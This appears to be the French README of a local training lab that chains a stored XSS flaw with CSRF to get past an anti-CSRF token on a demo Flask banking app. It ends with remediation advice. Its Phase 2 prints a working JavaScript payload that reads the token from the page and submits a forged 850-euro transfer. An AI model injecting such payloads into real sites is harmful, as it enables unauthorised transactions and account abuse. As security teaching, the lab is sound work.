# 🧪 Lab Avancé : Combo CSRF + XSS (Bypass de Jeton Anti-CSRF)

Ce module démontre une **chaîne d'exploitation complète** (*Exploit Chain*) illustrant le concept de **défense en profondeur**.

---

## 🎯 Problématique Sécurité

Une application bancaire protège ses opérations sensibles (virements) à l'aide d'un jeton anti-CSRF aléatoire et imprédictible lié à la session utilisateur (**Synchronizer Token Pattern**).
- Une attaque CSRF classique provenant d'un site pirate externe échoue car l'attaquant ne connaît pas ce jeton et la politique de même origine (**Same-Origin Policy - SOP**) lui interdit de lire les pages de la banque.
- **Mais que se passe-t-il si l'application contient une faille XSS (Cross-Site Scripting) ?**

---

## 🏗️ Architecture du Lab

```text
combo-csrf-xss/
├── app.py                      # Application Flask (Banque protégée CSRF + Forum avec XSS Stocké)
├── run_demo.bat                # Script de démarrage automatique (ports 5000 et 8081)
├── PIPELINE_DEMO.txt           # Scénario détaillé pas-à-pas pour la présentation
├── README.md                   # Ce guide technique
└── attacker/
    ├── 1_csrf_fail.html        # Page pirate externe : tentative CSRF classique (Échec 403)
    └── 2_xss_payload.txt       # Charge utile XSS : extraction du token dans le DOM + auto-submit
```

---

## ⚙️ Déroulement de la Démonstration

### Phase 1 : L'attaque CSRF pure est bloquée
1. L'utilisateur s'authentifie sur `http://127.0.0.1:5000` (`user` / `password123`).
2. L'attaquant incite l'utilisateur à visiter sa page `http://127.0.0.1:8081/1_csrf_fail.html`.
3. Cette page envoie une requête POST automatique vers `/virement`.
4. **Résultat :** Le serveur renvoie une erreur **HTTP 403 Forbidden**. L'attaque échoue car le jeton anti-CSRF est absent.

### Phase 2 : Le pivot via XSS Stocké
1. L'attaquant injecte le payload JavaScript (`attacker/2_xss_payload.txt`) dans le forum de l'application :
   ```html
   <script>
   var token = document.getElementById("csrf_token_input").value;
   var payload = new URLSearchParams();
   payload.append("dest", "Attaquant_Exploit_XSS");
   payload.append("montant", "850");
   payload.append("csrf_token", token);

   fetch("/virement", {
       method: "POST",
       headers: { "Content-Type": "application/x-www-form-urlencoded" },
       body: payload.toString()
   }).then(() => setTimeout(() => window.location.reload(), 1000));
   </script>
   ```
2. Lorsque la victime (ou tout autre utilisateur) consulte la page, le script s'exécute **dans le contexte d'origine légitime**.
3. Le script lit le jeton anti-CSRF directement dans l'élément `#csrf_token_input` du DOM.
4. Il déclenche la requête POST avec le jeton valide et le cookie de session authentique.
5. **Résultat :** Le virement est validé avec succès (-850 €).

---

## 🛡️ Mesures de Remédiation

1. **Échappement Contextuel des Données (Anti-XSS) :**
   Ne jamais afficher de données non assainies avec `| safe` dans les templates Jinja2. Par défaut, Jinja2 échappe les balises HTML (`<`, `>`, `&`, `"`, `'`).
2. **Content Security Policy (CSP) :**
   Mettre en place un en-tête HTTP CSP strict (ex: `default-src 'self'; script-src 'self' 'nonce-...'`) pour empêcher l'exécution de scripts inline injectés.
3. **Ré-authentification / Step-Up Auth :**
   Exiger une confirmation du mot de passe ou un code OTP (2FA) pour les actions bancaires irréversibles.
